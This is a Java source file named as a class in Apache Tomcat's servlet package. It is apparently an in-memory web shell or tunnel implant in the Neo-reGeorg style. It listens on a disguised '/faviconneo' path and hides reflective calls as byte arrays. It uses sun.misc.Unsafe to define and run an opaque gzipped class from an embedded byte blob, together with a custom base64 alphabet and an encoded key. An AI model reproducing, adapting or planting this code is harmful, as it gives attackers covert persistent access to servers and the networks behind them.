package org.apache.catalina.servlets.sl;

public class Neo {
    private static final String pathPattern= "/faviconneo";
    public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();

    public static Class unsafeloader(byte[] bytes) throws Exception {
        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
        field.setAccessible(true);
        Object unsafe = field.get(null);
        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
        m.setAccessible(true);
        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
        return clazz;
    }

    public static byte[] unGzip(byte[] bytes) throws Exception{
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0)
            out.write(buffer, 0, n);
        return out.toByteArray();
    }

    public static void doService(Object obj, String url, String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
            java.util.Map objMap = (java.util.Map) obj;
            Object request = objMap.get("request");
            Object response = objMap.get("response");
            try {
                String charslist = "eVU7Z6kD135qN0wfCYSxbF+RP/vjaiOylt82JndKAhTgu9B4zWmEMpoIXcQrsGHL";
                Object[] args = new Object[]{
                        request, //0
                        response, //1
                        charslist.toCharArray(), //2
                        new byte[]{-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,22,-1,-1,-1,25,13,8,35,9,47,10,5,3,34,45,-1,-1,-1,-1,-1,-1,-1,40,46,16,7,51,21,61,62,55,36,39,63,52,12,30,24,58,23,18,42,2,1,49,56,17,4,-1,-1,-1,-1,-1,-1,28,20,57,38,0,15,43,41,29,27,6,32,50,37,54,53,11,59,60,33,44,26,14,19,31,48,-1,-1,-1,-1,-1},//3
                        new Integer(200),//4
                        new Integer(513),//5
                        new Integer(524288),//6
                        "fUZ9qSVV+D/JiIF7YZiVCd63PE/F5MifSpVMvoiUPxJI0D3gSM9xw7bEvkc0idF0N73A+Zu4SZpKCbYUCE/N/d/5CM/d/7ng0U9/SIiIiM6hbx0Y1UM9fl==",//7
                        new Integer(134821321),//8
                };
                if(namespace.get(charslist) == null){
                    byte[] clazzBytes = unGzip(new byte[]{31,-117,8,0,-112,-81,-77,99,0,3,-99,57,9,120,27,-43,-47,51,-46,-82,118,37,-81,19,89,-74,28,-81,-81,-112,112,41,-78,-116,33,33,2,-28,36,-112,56,14,49,-79,29,-80,76,-116,-95,64,20,121,109,43,-111,37,35,-55,57,40,77,-95,-123,82,-82,2,-67,-88,67,33,16,-46,-86,-108,-108,35,-128,-30,96,98,-62,21,90,-54,-39,-46,-106,66,91,122,23,-24,1,-91,20,122,-30,127,102,119,37,75,-74,-62,-97,-1,-1,62,-21,29,-13,-26,-51,-101,-21,-51,-52,91,63,-5,-47,35,19,0,112,-110,69,114,64,9,-68,46,-63,-49,36,-72,-49,14,-9,-64,-49,37,120,-128,-5,95,72,-16,-122,3,36,-8,-91,4,-65,-110,-31,-41,18,-4,-58,65,-48,-33,74,-16,59,25,126,47,-61,31,100,120,83,-126,-73,28,80,6,111,115,-13,71,9,-2,-28,-128,10,120,-99,-101,63,59,-64,14,127,-31,-47,59,-68,-23,93,-90,-13,87,30,-67,39,-63,-33,28,80,10,-17,115,-13,119,110,62,-112,-31,67,-58,-2,7,47,-1,83,-122,127,-55,-16,111,9,-2,-29,-128,99,-31,-65,-36,124,36,-63,-92,3,60,8,-36,-96,-124,22,7,-36,-126,86,7,52,-96,32,-93,-24,64,27,74,18,-54,-36,-37,-71,113,-16,74,-119,-116,-118,-124,-91,14,-100,-123,-77,-71,113,-106,96,25,-70,74,-80,28,43,-72,113,-53,88,73,-89,-31,28,38,89,-59,-115,-54,-45,106,110,106,-120,23,-84,117,96,29,-42,83,67,44,82,-13,1,-93,-52,45,-63,-93,112,94,9,-50,71,-105,-116,71,51,-42,49,50,30,-53,43,-57,-55,120,60,-9,30,110,22,112,-29,-107,-79,65,66,-97,3,-50,33,117,96,35,-98,64,35,108,-30,-23,59,50,-98,-56,123,79,34,-115,-32,66,30,45,-110,-15,100,25,23,-13,-36,-17,-128,-115,120,10,55,-89,74,120,-102,3,46,-58,-128,3,-101,113,9,67,-106,-110,73,112,25,-13,112,-70,-116,103,-56,-72,-36,1,-75,76,109,5,-125,90,36,92,73,-104,-16,1,79,90,101,92,-27,-64,51,113,53,111,107,-29,-47,89,14,92,-125,-19,-52,67,-121,-116,-99,12,89,-53,-51,-39,-36,-100,-61,88,93,18,6,29,-80,-107,109,-73,21,-69,101,60,-105,-5,117,50,-10,48,-16,29,-34,120,30,55,-67,50,-98,-49,44,95,-64,-51,39,-72,-71,-112,-101,-117,-56,76,120,-79,3,-82,-59,-11,37,-80,24,67,-36,108,-112,48,-52,-112,62,9,53,9,-5,29,112,61,14,48,-18,-96,-124,17,7,-36,-60,-66,113,19,110,-28,102,19,107,61,-54,-51,16,55,49,9,-29,-28,-112,56,-52,102,-66,-60,78,90,73,72,-104,-76,-61,-83,-36,-89,-20,112,27,38,24,109,-124,-105,55,59,112,11,110,-27,102,27,55,-105,74,-8,73,7,-20,102,41,118,-29,101,-36,124,74,-62,-19,18,126,-38,1,119,-109,-125,-29,-27,18,94,33,-31,103,16,44,90,-116,-102,11,90,-88,-23,-45,120,-76,2,65,78,106,-55,100,36,30,75,34,-52,110,-33,24,-38,28,106,26,73,69,-94,77,29,-95,-31,102,4,123,48,50,16,11,-91,70,18,-124,-67,-72,112,117,-119,49,-115,-122,98,3,77,-63,84,34,18,27,104,-50,-125,-84,-35,-80,81,11,-89,-102,-105,17,13,-37,-110,72,44,-110,90,-122,96,-11,44,88,-121,32,-76,-60,-7,108,-101,118,-55,72,40,74,-121,-70,61,51,-73,45,56,31,65,-36,-32,63,-103,-39,-83,-12,92,-80,98,-63,-52,-77,12,4,-90,84,-23,-103,-71,-70,-128,37,-77,15,106,-95,62,45,-79,73,-37,-122,112,92,49,-92,98,84,29,-83,91,-61,-38,112,-54,80,-120,20,73,70,-29,-31,80,116,26,-105,-39,-3,-60,-91,99,67,116,-13,-59,125,90,88,-105,-55,75,-84,-26,-95,-75,-59,82,-38,-128,-106,32,102,102,74,104,-18,-44,98,-71,-99,51,113,-118,-110,34,-71,-108,72,108,115,124,-109,-42,-95,-91,6,-29,125,8,107,-118,40,112,38,-77,69,-24,47,40,-58,86,105,62,-15,-123,8,23,-2,-97,-87,-73,68,67,-55,-28,17,-97,103,79,-124,98,125,43,-74,-91,52,82,-73,-51,-45,-42,-90,75,-24,-40,-64,-128,-18,56,-119,77,118,102,7,104,35,96,36,-106,-22,-114,-101,-88,-94,-57,-64,-76,109,-42,18,-111,126,50,112,83,17,3,-23,-112,-83,77,49,45,-43,-108,76,70,-101,-126,-63,-10,-96,-31,-21,-70,-23,92,-31,65,45,-68,-87,37,26,-47,-120,110,98,36,-103,-46,72,-103,-127,-84,33,-110,90,120,36,17,73,109,107,10,107,-119,84,-45,121,-117,79,60,-83,-123,6,-111,-2,72,56,-108,-46,-118,104,96,-63,58,9,63,-101,37,26,-44,18,-60,87,-114,-88,107,64,75,45,15,-77,91,105,125,109,-55,-28,-120,-106,32,9,-114,-9,44,56,-94,-93,-24,-122,46,9,71,-11,43,-92,64,6,-10,33,-108,23,-47,-83,2,-9,-62,125,10,-36,15,15,32,-108,-51,-16,27,5,-81,-60,-85,16,-100,-45,-71,38,-11,19,107,61,116,-72,-106,40,88,54,-88,42,-16,93,-8,30,-62,44,29,30,-119,55,-27,16,105,83,75,-100,72,-57,82,-19,90,108,32,53,-120,0,-124,70,-48,-74,-40,-16,72,-118,104,107,-95,33,-30,51,-69,47,15,-86,-32,-25,-16,42,5,-81,-122,23,17,-26,76,103,103,-59,72,36,-38,-57,-36,126,30,-81,33,89,-15,90,5,-81,-61,-21,21,56,0,19,10,-34,-128,95,80,-32,41,120,58,75,87,-33,-105,-69,-84,10,-34,-120,55,41,120,51,-20,83,-16,-117,-84,36,-95,-69,-21,-36,86,5,-65,-124,95,86,-32,9,120,-110,60,38,-95,37,-75,-108,33,113,-10,-22,40,58,37,-10,-113,115,-69,-38,-7,68,34,-15,21,-4,42,66,117,110,97,117,42,53,76,-117,36,110,-116,52,-94,-97,116,11,-93,125,13,71,17,-114,42,116,48,-58,77,78,67,-34,1,-113,40,120,43,126,-99,-62,31,-7,-97,-124,-73,41,120,59,-18,52,79,-104,-38,-86,-5,74,71,40,22,-46,-83,117,7,-34,-87,-32,46,-68,75,-63,-35,-8,13,67,-77,-85,-11,88,-42,25,26,98,-17,119,-21,-20,-23,-111,-72,53,54,50,-92,37,66,124,-104,-124,-33,84,48,-115,-33,82,-16,110,-4,-74,-124,-9,40,-72,7,-65,35,-31,-67,10,-34,-121,-9,43,-8,0,-18,53,-92,55,72,41,-16,24,28,84,-16,65,124,72,-63,-121,49,-93,-64,33,120,70,-127,113,120,84,-63,125,56,38,-31,126,86,41,-15,62,-114,-113,74,120,64,-63,9,124,76,-62,-125,-60,-116,105,-7,70,-61,-12,10,62,-50,-38,45,-21,-90,123,-100,-20,-41,18,-115,-83,28,-46,-56,-104,10,62,1,-124,110,79,-26,14,-60,39,-55,-12,-16,38,62,-91,-32,-45,-8,-108,-79,20,76,81,118,33,-119,-22,-78,-66,-62,-9,123,121,34,17,-38,-74,118,36,-107,-13,26,9,15,41,-8,12,126,-105,89,-70,-106,54,-122,-6,-6,-78,52,-65,-57,-18,116,29,62,-85,-32,-9,-15,122,-124,18,-35,-54,43,70,-6,-5,-39,81,-91,-106,-75,-99,-99,-83,45,-35,10,62,71,126,-128,-49,-29,11,10,-66,-120,47,-27,-37,-73,-115,-102,96,60,-68,-119,110,104,95,31,109,78,-78,27,-68,44,-31,15,20,-4,33,-66,-94,-32,-113,-16,-57,10,-20,-123,7,21,-4,9,-66,74,41,115,-19,26,-14,-83,85,-53,-37,-38,41,32,-83,108,11,-26,14,-8,41,-66,-122,48,-41,32,75,98,-124,7,67,-28,3,-47,100,-109,65,-69,-59,-104,42,-8,58,-93,9,93,-83,-53,87,74,-8,51,5,127,-114,-65,-96,-53,-128,111,40,-8,75,-42,-7,-81,20,-4,53,-2,70,-63,-33,-30,24,49,-65,106,109,87,-49,-14,-82,-107,124,-14,-17,20,-4,61,47,-4,-127,13,121,35,-66,65,89,111,-26,-27,97,-103,-7,-18,-68,73,108,46,93,-54,-93,-73,16,112,41,11,-12,54,-17,122,-101,102,-115,10,-2,17,-1,-92,-32,-97,-15,47,10,-66,67,-105,-117,70,-92,-69,119,121,-12,87,124,79,-63,-65,-15,9,-17,-77,-85,-88,57,29,117,106,-87,45,-15,-60,38,14,38,-119,-2,80,88,83,-16,-17,-8,30,66,69,-127,18,77,-11,101,-99,51,11,62,57,-85,86,-4,-128,-81,-14,126,120,4,-95,118,-122,-79,11,34,-60,-43,122,-124,-64,15,21,120,1,94,84,-32,57,120,94,-127,-105,-32,101,-86,79,-90,37,25,5,-1,-127,-1,84,-16,95,-8,111,5,-1,-125,-1,-51,70,42,29,-95,61,-50,-31,45,111,71,112,48,-98,-96,-120,-10,44,124,95,-127,127,-29,71,18,78,42,22,32,97,45,-120,-93,-118,-59,98,-79,102,3,-96,126,-83,-70,40,43,-59,-121,20,-117,96,17,21,-117,-115,-99,110,-2,-1,30,-85,-77,-95,87,-89,-80,58,-108,28,-92,50,-119,-36,-92,83,-117,39,-76,51,-87,33,-122,-22,-89,69,-116,120,50,21,-93,59,-67,-114,-77,88,-124,93,118,26,2,-97,-112,31,27,40,111,20,-31,35,-113,-121,92,68,-92,-68,65,9,115,93,40,58,-94,-23,-91,87,27,-33,-101,-51,-95,72,52,-76,33,74,16,-127,116,77,17,-48,22,26,30,-42,98,52,104,60,-94,2,-55,-116,-48,-51,102,86,-90,114,78,78,-59,-77,-71,-92,-62,83,-76,-94,-110,54,51,15,107,-5,-71,82,107,-53,-57,-56,22,53,68,108,11,103,-106,-61,84,89,116,-120,-40,31,29,73,82,-106,17,-61,-47,120,-110,-16,-20,-31,-8,-48,112,40,-95,117,-57,15,-77,-121,-124,-99,21,39,-63,-90,34,49,-35,-7,44,123,102,-68,-97,90,35,14,-100,20,53,-70,-88,36,-43,-110,-71,-28,80,66,-96,-107,113,35,12,-111,-66,60,-25,51,39,-114,72,-78,45,-106,76,-123,98,97,98,-93,-100,99,-37,12,11,30,-19,-103,86,119,76,71,-47,69,-86,42,-60,-95,-36,-96,-57,-43,-83,116,84,-119,-98,72,-77,-121,-100,112,88,-61,20,-37,77,-94,8,92,43,32,-12,-104,-107,-52,20,-42,26,109,-101,-23,69,-51,-45,-105,-14,93,-84,121,90,85,18,-28,-127,102,92,8,-99,117,78,-1,70,88,91,21,10,-89,-30,9,-86,-66,-26,123,-118,-80,84,-128,-45,108,-88,107,58,-72,-120,-70,102,-20,-28,51,-13,50,94,75,60,26,53,-20,70,-63,70,-120,70,-110,-87,41,37,77,79,-119,89,23,-42,-31,122,-92,105,39,124,118,-54,-124,70,21,26,-5,82,121,-2,86,125,-107,-49,-101,85,8,-29,-53,-108,98,-102,-15,4,-69,113,62,-43,54,19,78,68,93,51,-95,116,-46,96,40,-39,-87,-37,-107,46,33,-107,-99,66,76,-97,20,94,-106,92,57,-20,-102,-14,-61,-77,19,-28,-63,-119,-44,54,46,21,15,83,-37,-50,-72,40,-77,-55,52,-7,-119,-109,-4,44,123,14,-123,-37,-4,21,-82,43,9,-39,44,-89,5,-113,94,77,87,20,-61,36,17,-24,-82,83,101,110,-46,55,50,-17,-86,-120,22,-19,-93,-99,101,5,-54,48,94,-115,-91,5,0,10,50,-12,4,11,114,-19,85,-120,76,-96,66,100,29,-57,105,60,12,-37,6,98,20,53,91,66,108,-94,89,-123,-89,26,108,116,105,-55,97,114,1,-51,120,78,-50,-55,19,51,47,-103,52,27,-101,91,19,-119,120,34,43,77,126,21,-68,-115,10,-12,33,14,-116,-20,26,-31,-8,-16,54,126,-118,-51,-76,75,91,17,-112,-82,15,91,-44,-84,127,-35,-123,-95,45,23,-4,4,26,-48,1,50,69,-85,-92,-90,63,103,4,-114,75,-20,-10,-39,104,116,-40,106,-127,-33,-50,73,29,-64,94,-102,23,-68,12,-84,-26,-30,79,95,-61,78,-45,112,-55,-122,97,35,-36,81,-10,-11,76,-89,100,-90,104,99,107,25,33,-10,71,6,-24,-54,-81,-96,-73,-17,38,61,-78,123,40,-8,21,-29,86,-29,-117,-56,-7,100,-118,99,-85,30,45,79,-3,-8,87,-29,-57,61,8,-83,3,-52,-18,113,69,8,20,69,-73,37,-76,-95,-8,102,45,-5,42,-120,-103,85,69,-74,2,-108,67,81,126,-63,115,114,-87,-54,-103,-88,16,-87,-103,-105,-118,46,112,26,17,117,-41,-56,105,-108,17,76,-46,-108,-116,-76,80,34,-33,52,-71,69,34,89,-110,-118,-25,-86,27,-86,-91,-90,62,98,-52,56,92,-24,-113,70,-24,-110,40,20,39,-70,-76,-95,16,69,111,86,121,-115,-89,-91,88,-6,53,-9,-8,-114,48,91,103,-113,-16,-24,-90,21,-109,-61,81,78,13,-59,-30,73,-63,71,-118,-100,-5,-38,-109,35,27,-110,102,122,-81,-28,-41,121,49,36,18,-11,92,-86,34,18,-58,101,-107,6,-116,-92,72,-47,-124,70,-45,75,-57,36,-21,34,63,8,-28,7,107,-46,50,41,-95,-125,-18,125,107,84,27,-94,55,6,97,-105,112,-72,52,-89,70,-22,-55,43,54,-103,-36,44,-13,-68,92,-3,105,70,-85,54,35,-64,-23,-123,98,-98,-111,-90,-86,71,-50,-6,-111,-28,-14,100,-110,63,113,-111,15,-81,74,-60,-121,56,46,-49,-64,-45,-93,118,119,-17,-39,-83,116,57,-118,16,57,-93,-120,54,103,126,15,-55,63,62,-95,-11,-13,-59,105,50,42,-115,102,-77,24,40,-74,-58,31,123,-110,-4,-23,-128,-72,-44,-53,-74,-46,-92,-15,41,33,59,-73,25,-97,107,16,78,43,114,97,-114,-12,27,-116,-60,58,54,-126,-109,71,87,-100,-99,1,122,106,-128,121,112,15,-108,-128,5,-10,-64,119,-64,74,-3,-67,112,31,0,-11,-9,-61,3,-44,-37,-7,105,68,111,-1,-121,116,-40,-61,-32,-94,113,6,-10,81,59,70,-112,50,-22,-111,122,-47,75,16,70,-25,-49,4,-12,2,48,-106,109,-125,96,-125,-7,-44,11,13,7,-63,66,127,29,62,-21,-62,78,-97,-80,48,32,120,125,-30,-62,-125,96,-91,-65,-121,-127,38,54,-102,-120,-12,-9,48,-40,124,18,-115,-91,12,-56,126,-47,39,103,-121,54,-97,-45,-106,29,75,62,39,-93,-40,3,-78,-49,-103,67,-80,11,126,-121,-24,47,-79,-7,21,-55,95,42,-5,103,57,109,-2,-39,78,-55,-17,116,-54,-2,50,-89,-35,-17,82,5,-105,-61,122,0,74,-58,64,57,8,-91,-127,114,-89,-121,38,-127,10,-93,115,55,-70,102,-27,22,37,-125,-94,101,39,-60,92,-77,3,-107,-115,46,103,110,-87,44,48,71,-99,-109,1,-105,-65,-54,93,101,-71,3,108,105,56,-59,93,-11,-88,28,80,-43,57,-86,-102,-127,114,3,118,-12,56,84,-12,-18,3,-73,90,-103,-127,-54,113,-80,-9,-86,-22,62,-96,109,52,-83,10,84,-90,39,31,-13,-14,-118,26,-88,82,-85,-36,-10,49,-88,30,-125,-102,64,5,109,11,84,-86,-27,-116,-18,85,101,90,-42,-73,-44,-87,-27,25,-88,-25,102,-82,117,-113,90,-31,46,-45,-27,-82,84,43,15,89,-30,52,117,-23,83,-30,-55,117,84,6,-26,-115,-126,-94,83,-98,-65,-61,-46,-59,-72,24,100,20,106,5,-41,-47,-90,8,61,-115,-82,99,114,-46,-40,3,85,-29,112,108,-81,90,-71,15,-114,35,17,72,-128,-29,15,-126,39,80,-83,86,-85,85,25,88,-96,86,11,25,-16,-70,26,-44,-22,12,-8,70,-95,73,-83,62,8,13,-34,12,52,-70,78,24,-125,-90,64,-115,90,-125,-62,1,56,-79,-41,-22,13,98,6,78,-46,-105,-43,-102,12,44,-52,-64,-94,70,-41,-55,-71,99,22,51,-22,24,-8,3,-75,106,-19,24,-100,-94,-42,-18,-121,83,17,2,117,106,-35,126,56,13,97,20,22,-14,40,-128,-64,28,-43,55,-70,-102,-119,106,73,-81,85,-83,15,-102,92,-50,37,-122,-22,-57,96,-119,58,55,3,75,-45,-109,-49,22,55,-42,82,-26,115,89,-96,46,13,82,-96,-34,-70,-57,75,-78,27,-54,61,61,3,103,4,-22,-43,-6,12,44,39,82,117,-22,92,-85,58,119,34,3,43,-44,-70,12,-76,112,-77,-110,119,-74,-18,-121,85,-20,-71,103,22,-80,118,86,62,107,106,-3,33,-16,-85,-11,-82,-43,25,104,-37,1,62,26,-99,-91,-113,-26,51,127,25,88,67,-44,5,87,-69,-104,-27,-66,87,80,-25,-78,8,61,-23,-55,-67,124,66,71,25,-34,-76,11,74,121,-40,-55,108,30,-53,-93,-75,124,-40,51,-96,-46,-50,-77,13,-71,-35,34,113,-83,-17,-77,-18,41,19,-128,-68,107,-18,56,-100,67,-2,-44,21,56,-118,-71,39,55,-21,-11,-41,-109,-64,-11,-18,122,90,-100,-57,-14,-52,-77,-70,73,65,65,-11,40,117,94,6,-70,-45,-109,-81,-87,-28,15,-25,-46,-102,-32,90,103,-16,-29,90,-51,-4,-48,106,-49,24,-100,-89,83,-97,58,81,103,46,123,-88,90,-50,88,-67,-45,93,79,112,-99,-97,117,-95,98,-84,-110,-78,75,-78,-66,120,8,63,-92,-87,-94,79,-85,-56,53,47,32,-41,-36,1,17,-126,-51,-42,97,42,-115,-100,60,26,-125,79,-8,-55,62,23,-78,127,100,-32,-94,113,-72,-104,110,-118,-69,122,31,-84,47,43,25,-53,64,72,-83,-79,102,96,67,-49,94,8,-85,85,106,-51,126,-24,-77,66,-113,-22,118,-105,-70,-76,96,26,-109,68,-121,-57,-3,65,-22,102,-79,-13,14,16,-12,66,58,111,80,63,-81,81,-33,-74,31,34,22,50,-34,70,-61,-67,47,-54,-64,-90,52,-120,-127,106,115,45,106,-127,-98,52,46,-96,61,67,-6,-98,123,102,-20,57,4,91,-36,-74,49,-120,-47,-91,80,89,77,113,127,-115,91,-14,-41,90,-3,117,89,-101,-44,-69,107,110,-121,46,119,13,-37,-119,49,-122,-55,-69,-84,-18,26,-74,70,61,27,-85,-101,-127,-105,-12,-72,-21,-36,53,-21,-3,-44,-72,109,119,-126,-125,102,-75,119,-126,-109,56,119,-80,-25,36,-126,105,-104,-99,59,32,61,121,95,86,74,-88,-92,-125,-13,-92,-84,-42,-91,-124,45,-60,113,82,-25,120,104,58,-57,21,110,-121,25,73,-7,30,79,48,-21,-92,93,-34,-104,-22,97,45,-113,-24,-19,-26,81,32,-107,-15,104,11,121,-25,-69,-71,-29,-22,-117,28,-105,85,-100,90,-18,37,-32,-44,-107,42,-16,-112,52,-52,-3,-72,-40,-107,6,-95,-61,-70,-121,-110,-52,78,-100,-121,-57,64,-83,37,108,-39,104,25,-126,90,-63,34,-84,21,-70,-88,-65,66,-72,70,-72,-98,-6,-121,-59,-59,-30,-87,80,43,14,-120,-69,-59,52,-44,82,50,105,-79,81,57,-117,43,45,-61,-36,91,46,-79,46,-26,-34,-22,-73,78,-24,-3,99,-30,71,-36,-21,89,103,28,30,53,-78,14,86,-126,8,50,-11,-114,113,-40,74,70,-38,-42,-47,48,-79,-52,-22,23,-36,66,-35,46,120,-65,-63,45,92,41,-32,-94,50,-104,-36,-18,23,9,116,7,52,-8,-68,15,-127,-32,22,-59,-53,78,-50,-64,-91,61,-26,-52,-74,93,-38,106,-52,93,-97,-52,-64,101,61,105,-40,-97,-65,-43,-90,111,109,61,-20,86,-73,-83,12,-34,-35,46,93,118,121,-34,-126,-51,57,123,-69,-104,37,-6,41,-125,104,95,62,81,-23,-1,65,-50,45,-107,-63,-63,-19,78,91,-63,-110,-28,60,125,-69,62,77,79,42,-66,12,108,-65,-33,-52,-52,7,96,-62,-44,-111,11,4,112,80,111,107,-96,-72,-40,-31,-101,88,-58,14,93,-73,15,62,29,16,-84,-92,23,-111,84,-11,38,-111,-78,-7,-36,-30,-107,34,46,90,68,2,51,-52,-18,-74,89,118,78,-66,69,-83,-98,-22,-98,46,64,-111,76,20,73,71,-111,12,-108,93,42,113,-54,108,58,79,100,-2,51,112,-71,-119,-17,-105,-35,-78,115,-23,29,96,87,41,-49,36,-18,103,74,110,-103,-95,6,17,-118,-23,-109,-81,82,-85,19,-71,80,101,-103,102,-77,34,100,-25,-110,-19,98,1,29,-69,-37,62,-99,-114,-99,-95,6,29,-69,78,-57,110,-48,113,19,29,-39,70,-38,-38,-22,-74,51,-119,-12,100,-107,-79,75,-41,-113,-52,-33,-53,-87,-56,-31,-62,38,73,-6,-79,81,63,-32,-102,-35,-18,117,93,-111,-127,-49,-80,-110,-78,94,-76,-38,-25,-90,34,70,52,19,61,-87,-80,82,21,-83,68,-24,-77,25,-72,82,-97,-48,-8,42,35,-29,-73,-25,33,49,29,29,70,22,79,79,-114,53,88,9,-40,35,-12,-47,62,-125,-127,-57,-23,39,-128,-31,-48,79,-64,-109,38,43,-101,-88,42,-109,-88,-65,-104,-77,117,3,37,-21,12,124,-114,-30,-11,-43,-99,-115,-5,-31,-13,-100,-91,-50,-92,-63,53,-100,-92,-82,13,8,44,-50,117,1,81,21,-51,53,15,-113,-12,-59,-21,3,54,-43,-10,56,-36,48,10,101,-86,45,3,95,32,-65,-72,113,20,68,97,79,122,-14,-107,-12,100,-122,-18,103,33,11,118,-2,87,-116,89,-26,-35,64,55,-118,-68,5,-82,-48,-21,-91,14,-21,50,-17,-124,95,-112,40,-26,-39,-58,-31,-90,94,-86,-3,110,14,72,117,110,97,23,5,109,74,-57,95,-12,-117,-86,-92,-38,-84,-86,-115,-14,-20,-105,122,84,-118,-96,95,38,73,-27,62,54,57,109,-78,-45,-86,-35,-86,-38,-11,-43,58,-126,-83,95,-65,-52,45,10,-69,-95,-38,45,58,-19,119,65,57,89,86,-81,-101,-20,20,72,40,44,-39,105,-82,-38,-125,-23,-55,-99,62,67,79,118,-2,79,-122,-55,-38,117,-60,46,107,103,-117,-41,42,59,43,-58,-32,43,65,-81,-13,120,115,100,6,105,-30,-73,-50,59,-79,11,-70,-68,117,11,15,-63,42,106,89,79,-113,-125,125,-108,98,-80,64,-103,-120,75,3,-118,55,-91,60,-47,99,-89,-24,-85,99,7,83,-59,9,-26,123,-3,24,124,-107,34,57,77,57,-69,-46,-78,-19,74,43,-39,-17,94,-97,-18,57,8,93,48,0,27,117,-93,-39,-7,-33,105,-90,-39,-94,-90,7,-83,-9,77,28,-128,91,58,117,-41,-15,17,23,107,-40,119,50,-16,-75,-128,-24,-110,-104,-30,-24,40,-108,-20,-123,29,-52,-64,49,-82,91,-89,32,95,103,-120,-53,117,-101,9,-111,-9,-62,-19,1,-79,-47,45,-88,98,80,119,-97,-121,-68,13,-115,-66,49,-40,57,-35,117,-20,-4,1,-36,-28,-31,36,114,29,-26,-31,88,47,31,72,66,55,16,-49,119,-80,123,100,-32,-50,29,116,101,-40,81,119,-87,-94,-73,49,3,119,-51,36,-12,28,60,111,106,-7,4,34,36,82,63,127,28,118,-109,74,-65,-47,-31,-85,-87,-18,19,-42,103,-32,-101,-43,-21,-105,-43,-111,77,5,31,123,94,90,21,-78,22,122,1,94,52,-9,-98,-94,-65,42,-128,-118,71,-101,30,-26,-68,-94,-34,57,-27,-83,-105,123,5,99,-24,-92,-95,-43,24,86,109,-67,124,73,-51,30,-109,-56,75,-16,-78,73,-28,116,98,-118,-119,44,34,-81,107,111,-80,85,51,-18,-51,-35,13,98,-75,83,-66,-44,28,11,-43,78,103,118,108,-83,118,86,101,-57,-39,-32,-9,3,-8,-95,73,108,22,-11,86,-22,45,-62,30,115,-19,21,-8,-111,-87,-78,82,-6,-15,-102,-7,-102,-55,-86,-29,-57,-12,-5,-55,-111,32,-67,10,63,-99,-2,54,-94,-54,-23,91,-39,8,-13,90,-18,-23,52,71,-105,7,-96,100,28,-18,38,-107,126,-5,65,8,27,-44,-32,127,0,-21,-71,71,-95,-65,36,0,0});
                    Class clazz = unsafeloader(clazzBytes);
                    namespace.put(charslist, clazz.newInstance());
                }
                namespace.get(charslist).equals(args);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
